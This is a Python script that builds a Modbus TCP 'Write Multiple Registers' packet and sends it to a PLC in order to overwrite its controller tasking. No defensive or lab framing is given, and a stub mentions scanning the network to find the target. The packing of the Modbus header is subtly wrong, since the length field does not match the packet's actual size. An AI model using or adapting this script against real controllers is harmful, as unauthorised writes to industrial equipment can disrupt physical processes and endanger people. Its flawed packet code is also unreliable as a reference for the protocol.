import socket
import struct

# Constants
PLC_IP = "192.168.1.10"  # Replace with the actual IP address of the PLC
PLC_PORT = 502  # Modbus TCP port
MODBUS_FUNCTION_CODE = 0x10  # Write Multiple Registers
START_ADDRESS = 0x0000  # Replace with the actual start address of the task association
NUM_REGISTERS = 2  # Number of registers to write (adjust as needed)
NEW_TASK_ASSOCIATION = [0x1234, 0x5678]  # Replace with the desired task association values

def find_plc_ip():
    # Implement a method to discover the PLC's IP address (e.g., ARP scanning, network discovery)
    # For simplicity, we'll assume the IP is known or provided manually.
    return PLC_IP

def create_modbus_packet(start_address, num_registers, values):
    # Create a Modbus TCP packet to write multiple registers
    transaction_id = 0x0001
    protocol_id = 0x0000
    unit_id = 0x01
    byte_count = num_registers * 2

    # Pack the Modbus header
    header = struct.pack('>HHHBB', transaction_id, protocol_id, num_registers + 2, unit_id, MODBUS_FUNCTION_CODE)
    # Pack the start address and number of registers
    body = struct.pack('>HH', start_address, num_registers)
    # Pack the byte count and values
    body += struct.pack('>B', byte_count)
    for value in values:
        body += struct.pack('>H', value)

    return header + body

def modify_controller_tasking(plc_ip, start_address, num_registers, new_task_association):
    try:
        # Create a socket connection to the PLC
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, PLC_PORT))

        # Create the Modbus packet
        packet = create_modbus_packet(start_address, num_registers, new_task_association)

        # Send the packet to the PLC
        sock.send(packet)

        # Receive the response (optional, depending on the use case)
        response = sock.recv(1024)
        print("Response from PLC:", response.hex())

        # Close the socket
        sock.close()

        print("Controller tasking modified successfully.")
    except Exception as e:
        print(f"Error modifying controller tasking: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address (if not already known)
    plc_ip = find_plc_ip()
    print(f"Found PLC IP: {plc_ip}")

    # Step 2: Modify the controller tasking
    modify_controller_tasking(plc_ip, START_ADDRESS, NUM_REGISTERS, NEW_TASK_ASSOCIATION)